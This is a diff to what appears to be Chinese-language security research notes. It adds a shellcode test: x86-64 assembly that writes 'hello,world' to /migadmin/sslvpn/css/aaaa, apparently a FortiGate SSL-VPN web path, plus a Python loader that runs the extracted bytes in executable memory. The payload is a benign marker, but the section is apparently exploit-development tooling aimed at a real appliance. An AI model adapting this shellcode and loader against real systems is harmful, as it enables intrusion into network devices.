@@ -336,6 +336,94 @@ if __name__ == "__main__":
     start_tftp_server()
 ```
 
+# shellcode 测试
+
+```asm
+section .text
+    global _start
+_start:
+	dq 0xfefefefefefefefe
+	xor rax,rax
+	xor rdi,rdi
+	xor rsi,rsi
+	xor rdx,rdx
+
+	mov rax, 2 
+	lea rdi, [rel filename]
+	mov rsi, 577	
+	mov rdx, 0644 
+	syscall
+
+	mov [rel fd], rax 
+	mov rax, 1  
+	mov rdi, [rel fd]
+	lea rsi, [rel msg]
+	mov rdx, 12
+	syscall
+
+	mov rax, 3  
+	mov rdi, [rel fd] 
+	syscall
+
+	mov rax, 60
+	xor rdi, rdi
+	syscall
+
+filename:
+	db '/migadmin/sslvpn/css/aaaa',0
+msg:	
+	db 'hello,world',0
+fd:
+	dq 0
+	dq 0xfefefefefefefefe
+```
+
+```
+nasm -f elf64 shellcode.asm
+```
+
+```python
+import ctypes
+import mmap
+
+def extract_section(file_path, start_marker, end_marker):
+    # 打开文件并读取为二进制数据
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+    
+    # 定义起始和结束的标记（十六进制字节序列）
+    start_bytes = bytes.fromhex(start_marker[2:])  # 去掉 '0x'
+    end_bytes = bytes.fromhex(end_marker[2:])  # 去掉 '0x'
+
+    # 查找起始和结束标记的位置
+    start_pos = file_data.find(start_bytes)
+    if start_pos == -1:
+        raise ValueError(f"Start marker {start_marker} not found in the file.")
+    
+    end_pos = file_data.find(end_bytes, start_pos + len(start_bytes))
+    if end_pos == -1:
+        raise ValueError(f"End marker {end_marker} not found in the file.")
+    
+    # 提取标记之间的内容
+    extracted_data = file_data[start_pos + len(start_bytes):end_pos]
+    
+    return extracted_data
+
+file_path = 'shellcode.o'
+start_marker = '0xfefefefefefefefe'
+end_marker = '0xfefefefefefefefe'
+shellcode = extract_section(file_path, start_marker, end_marker)
+page_size = mmap.PAGESIZE
+
+mem_size = ((len(shellcode) + page_size - 1) // page_size) * page_size
+exec_memory = mmap.mmap(-1, mem_size,mmap.MAP_PRIVATE | mmap.MAP_ANON,mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
+exec_memory.write(shellcode)
+
+# 创建一个函数指针并调用 Shellcode
+shellcode_func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(exec_memory)))
+shellcode_func()
+```
+
 # 资料
 
 恢复出厂
